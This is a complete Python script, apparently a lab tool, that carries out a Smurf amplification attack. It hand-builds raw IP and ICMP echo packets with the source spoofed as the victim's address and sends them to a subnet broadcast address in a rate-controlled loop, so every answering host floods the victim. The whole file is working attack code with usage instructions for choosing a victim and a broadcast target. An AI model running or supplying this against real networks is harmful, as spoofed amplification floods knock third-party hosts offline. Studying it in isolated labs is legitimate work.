#!/usr/bin/env python3
"""smurf.py — hand-rolled Smurf-attack packet generator (lab bring-up tool).

Every header byte and BOTH checksums are computed here; no hping/nping/scapy.
It opens a raw IPPROTO_RAW socket with IP_HDRINCL, builds an IP + ICMP-echo
packet whose source is the VICTIM (spoofed) and whose destination is a subnet
DIRECTED BROADCAST, and sends it in a rate-controlled loop. On a misconfigured
network every live host on the broadcast subnet answers the victim, so N hosts
turn 1 request into N replies (amplification factor N).

Run inside the attacker namespace as root, e.g.:
    ip netns exec attacker python3 smurf.py --victim 10.0.20.100 \
        --broadcast 10.0.10.255 --count 100 --rate 50

Fields set (report Table 1): IP src=victim, dst=broadcast, proto=1(ICMP),
recomputed IP checksum; ICMP type=8 code=0, id/seq, recomputed ICMP checksum.
"""
import argparse
import os
import socket
import struct
import sys
import time


def checksum(data: bytes) -> int:
    """16-bit one's-complement Internet checksum (RFC 1071)."""
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) | data[i + 1]   # sum 16-bit big-endian words
    total = (total >> 16) + (total & 0xFFFF)     # fold carries
    total += total >> 16
    return (~total) & 0xFFFF                      # store big-endian ('!H')


def build_ip_header(src: str, dst: str, payload_len: int, ip_id: int) -> bytes:
    total_len = 20 + payload_len
    ihl_ver = (4 << 4) | 5           # IPv4, 5 * 4 = 20-byte header
    fields = (
        ihl_ver, 0, total_len, ip_id, 0, 64, socket.IPPROTO_ICMP, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )
    header = struct.pack("!BBHHHBBH4s4s", *fields)          # checksum = 0
    chk = checksum(header)
    fields = fields[:7] + (chk,) + fields[8:]
    return struct.pack("!BBHHHBBH4s4s", *fields)            # checksum filled


def build_icmp_echo(icmp_id: int, seq: int, payload: bytes) -> bytes:
    head = struct.pack("!BBHHH", 8, 0, 0, icmp_id, seq)     # type=8,code=0,ck=0
    chk = checksum(head + payload)
    head = struct.pack("!BBHHH", 8, 0, chk, icmp_id, seq)
    return head + payload


def main() -> int:
    ap = argparse.ArgumentParser(description="Hand-crafted Smurf sender.")
    ap.add_argument("--victim", required=True, help="spoofed source (flood target)")
    ap.add_argument("--broadcast", required=True, help="subnet directed-broadcast dst")
    ap.add_argument("--count", type=int, default=100, help="requests to send (default 100)")
    ap.add_argument("--rate", type=float, default=50.0, help="packets/sec (default 50)")
    ap.add_argument("--size", type=int, default=0, help="ICMP payload bytes (default 0)")
    args = ap.parse_args()

    if args.rate <= 0:
        ap.error("--rate must be > 0")
    if args.size < 0:
        ap.error("--size must be >= 0")

    payload = bytes((0x41 + (i % 26)) for i in range(args.size))
    icmp_id = os.getpid() & 0xFFFF
    interval = 1.0 / args.rate

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("error: raw socket needs root (run under sudo / ip netns exec).", file=sys.stderr)
        return 1
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    ip_header = build_ip_header(args.victim, args.broadcast, 8 + args.size, 0x1234)
    sent = 0
    print(f"smurf.py: src={args.victim} (spoofed) -> dst={args.broadcast}  "
          f"count={args.count} rate={args.rate}pps payload={args.size}B")
    try:
        for seq in range(args.count):
            pkt = ip_header + build_icmp_echo(icmp_id, seq & 0xFFFF, payload)
            s.sendto(pkt, (args.broadcast, 0))
            sent += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    finally:
        s.close()
    print(f"smurf.py: sent {sent} spoofed echo requests")
    return 0


if __name__ == "__main__":
    sys.exit(main())
